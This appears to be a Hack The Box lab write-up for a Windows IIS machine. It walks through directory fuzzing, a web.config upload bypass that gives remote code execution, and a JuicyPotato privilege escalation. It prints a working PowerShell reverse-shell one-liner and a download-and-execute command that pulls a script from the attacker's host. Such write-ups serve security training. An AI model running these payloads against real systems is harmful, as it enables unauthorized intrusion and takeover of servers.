# Box 



![](img/Pasted%20image%2020210821025658.png)

https://app.hackthebox.eu/machines/142

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Reconnaissance](#reconnaissance)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [Root](#root)

# Contents 

## Reconnaissance

Let's start with nmap :

```bash
nmap -vv -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.93 10.10.10.93
```



![](img/Pasted%20image%2020210821025753.png)

We have a IIS 7.5, the only thing showing with searchsploit is bypassing authentication. Anyways, let's go the website.

![](img/Pasted%20image%2020210821025909.png)

On the website there is a pretty image but nothing interesting. So we have to dig further.

Using `ffuf` and a wordlist found on https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services I got interesting path :

```
┌──(kali㉿kali)-[~/Hacking/tmp]
└─$ ffuf -u http://10.10.10.93/FUZZ -w  iisfinal.txt  -recursion -e .php,.bak,.old,.asp,~,.aspx,.axd                                                                          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.93/FUZZ
 :: Wordlist         : FUZZ: iisfinal.txt
 :: Extensions       : .php .bak .old .asp ~ .aspx .axd 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 630, Words: 25, Lines: 32]
/aspnet_client/         [Status: 403, Size: 1233, Words: 73, Lines: 30]
aspnet_client           [Status: 301, Size: 156, Words: 9, Lines: 2]
[INFO] Adding a new job to the queue: http://10.10.10.93/aspnet_client/FUZZ

aspnet_client/          [Status: 403, Size: 1233, Words: 73, Lines: 30]
[INFO] Starting queued job on target: http://10.10.10.93/aspnet_client/FUZZ

                        [Status: 403, Size: 1233, Words: 73, Lines: 30]
/system_web/            [Status: 403, Size: 1233, Words: 73, Lines: 30]
system_web              [Status: 301, Size: 167, Words: 9, Lines: 2]
[INFO] Adding a new job to the queue: http://10.10.10.93/aspnet_client/system_web/FUZZ

system_web/             [Status: 403, Size: 1233, Words: 73, Lines: 30]
[INFO] Starting queued job on target: http://10.10.10.93/aspnet_client/system_web/FUZZ

                        [Status: 403, Size: 1233, Words: 73, Lines: 30]
2_0_50727               [Status: 301, Size: 177, Words: 9, Lines: 2]
[INFO] Adding a new job to the queue: http://10.10.10.93/aspnet_client/system_web/2_0_50727/FUZZ

2_0_50727/              [Status: 403, Size: 1233, Words: 73, Lines: 30]
[INFO] Starting queued job on target: http://10.10.10.93/aspnet_client/system_web/2_0_50727/FUZZ

                        [Status: 403, Size: 1233, Words: 73, Lines: 30]
:: Progress: [10440/10440] :: Job [4/4] :: 2753 req/sec :: Duration: [0:00:04] :: Errors: 32 ::
```

Unfortunaly even with these pass I couldn't find anything so I run another wordlist.

```
ffuf -u http://10.10.10.93/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt  -recursion -e .php,.bak,.old,.asp,~,.aspx,.axd 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.93/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 :: Extensions       : .php .bak .old .asp ~ .aspx .axd 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

aspnet_client           [Status: 301, Size: 156, Words: 9, Lines: 2]
[INFO] Adding a new job to the queue: http://10.10.10.93/aspnet_client/FUZZ

.                       [Status: 200, Size: 630, Words: 25, Lines: 32]
transfer.aspx           [Status: 200, Size: 941, Words: 89, Lines: 22]
uploadedfiles           [Status: 301, Size: 156, Words: 9, Lines: 2]
[INFO] Adding a new job to the queue: http://10.10.10.93/uploadedfiles/FUZZ

trace.axd               [Status: 403, Size: 2062, Words: 463, Lines: 50]
[INFO] Starting queued job on target: http://10.10.10.93/aspnet_client/FUZZ

.                       [Status: 403, Size: 1233, Words: 73, Lines: 30]
trace.axd               [Status: 403, Size: 2062, Words: 463, Lines: 50]
system_web              [Status: 301, Size: 167, Words: 9, Lines: 2]
[INFO] Adding a new job to the queue: http://10.10.10.93/aspnet_client/system_web/FUZZ

[INFO] Starting queued job on target: http://10.10.10.93/uploadedfiles/FUZZ

.                       [Status: 403, Size: 1233, Words: 73, Lines: 30]
trace.axd               [Status: 403, Size: 2062, Words: 463, Lines: 50]
[INFO] Starting queued job on target: http://10.10.10.93/aspnet_client/system_web/FUZZ

.                       [Status: 403, Size: 1233, Words: 73, Lines: 30]
trace.axd               [Status: 403, Size: 2062, Words: 463, Lines: 50]
:: Progress: [450344/450344] :: Job [4/4] :: 3222 req/sec :: Duration: [0:02:59] :: Errors: 0 ::
```

Here we have a 200 response code on `transfer.aspx` so let's see. 

![](img/Pasted%20image%2020210821035433.png)

So we can upload files here. At first I tried to upload a webshell but it didn't work. It allows only images. We need to find a way to upload a malicious file.

## Exploitation

Reading through a lot of article I found the golden gem : 

https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/

It seems that you can upload `web.config` and upload asp code in it.

Let's try this payload : 
```
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

![](img/Pasted%20image%2020210821041831.png)

Nice ! Now looking for a webshell I found this link : 

https://github.com/tennc/webshell/blob/master/aspx/web.config

Let's upload it.

![](img/Pasted%20image%2020210821042027.png)

Great we know have a RCE ! 

Let's get a shell. 

Our usual payload : 
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Encode it in base64.

![](img/Pasted%20image%2020210821042252.png)


## Post-Exploitation
### User
We already are user. 

To root.

### Root

Let's check for our user privilege `whoami /priv` : 

![](img/Pasted%20image%2020210821043049.png)


Our user has the `SeImpersonatePrivelege` so we can use `JuicyPotato` to get a root shell.

As always, you have to know what OS it is and get a good CLSID. (https://github.com/ohpe/juicy-potato/tree/master/CLSID)

To transfer `JuicyPotato`, use a smb server.

```
smbserver.py share . -smb2support
```

Mount it on the remote machine :

```
net use x: \\10.10.14.13\share
```

Put our previous payload in a file called `rev.ps1`, change the port and we can go!

```
.\JuicyPotato -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.13:4444/rev.ps1')" -t *
```

![](img/Pasted%20image%2020210821043531.png)

Rooted.

